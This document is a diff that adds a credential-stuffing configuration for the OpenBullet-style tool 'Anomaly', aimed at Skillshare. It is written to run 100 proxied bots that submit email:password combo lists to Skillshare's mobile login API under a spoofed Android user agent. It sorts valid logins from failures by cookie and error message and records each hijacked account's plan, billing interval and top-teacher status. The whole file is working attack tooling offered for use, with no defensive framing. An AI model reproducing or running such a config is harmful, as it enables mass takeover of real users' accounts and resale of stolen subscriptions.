@@ -1,0 +1,77 @@
+[SETTINGS]
+{
+  "Name": "Skillshare",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-14T23:28:58.7329296+02:00",
+  "AdditionalInfo": "Captures Plan, Sub Interval & if Top Teacher. Free goes to FREE.",
+  "Author": "ND03",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#id_Gen FUNCTION GenerateGUID -> VAR "id" 
+
+#num_Gen FUNCTION RandomString "?d?d?d?d?d?d?d?d?d?d?d?d?d-?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d" -> VAR "num" 
+
+#Login REQUEST POST "https://api.skillshare.com/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"appsflyer_id\":\"<num>\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "X-Embed-Mode: on" 
+  HEADER "User-Agent: Skillshare/5.2.7.15; Android 5.1.1 Mobile" 
+  HEADER "Accept: application/vnd.skillshare.user+json;,version=1.3" 
+
+#Login KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES(skillshare_user_)>" Exists 
+  KEYCHAIN Failure OR 
+    KEY "code\":135,\"message\":\"Incorrect email or password.\"}]}" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "membership_label\": \"free\"," 
+
+#Plan PARSE "<SOURCE>" JSON "membership_label" CreateEmpty=FALSE -> CAP "Plan" 
+
+#Sub_Type PARSE "<SOURCE>" JSON "plan_type" CreateEmpty=FALSE -> CAP "Interval" 
+
+#Top_Teacher PARSE "<SOURCE>" JSON "is_top_teacher" CreateEmpty=FALSE -> CAP "Top Teacher" 
+
